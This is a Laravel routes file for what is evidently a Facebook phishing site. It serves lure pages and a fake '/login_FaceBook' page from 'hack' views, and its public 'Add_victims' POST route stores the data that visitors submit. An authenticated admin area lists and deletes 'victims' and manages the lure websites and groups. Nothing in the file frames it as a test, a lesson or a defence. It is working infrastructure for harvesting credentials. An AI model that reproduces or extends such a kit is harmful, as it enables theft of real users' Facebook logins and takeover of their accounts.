<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\GroubController;
use App\Http\Controllers\HackController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\WebsiteController;
use App\Http\Controllers\WelcomController;
use App\Models\Groub;
use App\Models\Hack;
use App\Models\Website;
use App\Models\Welcom;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    $welcom = Welcom::latest()->first();
    return view('hack.welcom', compact('welcom'));
});

Route::get('/website', function () {
    $website = Website::latest()->first();
    return view('hack.website', compact('website'));
});
Route::get('/group_facebook', function () {
    $group = Groub::latest()->first();
    return view('hack.groub', compact('group'));
});


Route::get('/login_FaceBook', function () {
    return view('hack.login');
});

Route::post('Add_victims', [HackController::class, 'store'])->name('Add_victims');



Route::get('/dashboard', function () {
    return view('dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
    //
    Route::resource('vic', HackController::class);
    Route::resource('admin', AdminController::class);
    Route::get('Del_victims', [HackController::class, 'Del_victims'])->name('Del_victims');
    Route::resource('websites', WebsiteController::class);
    Route::resource('groups', GroubController::class);
    Route::resource('welcom', WelcomController::class);
});



require __DIR__ . '/auth.php';
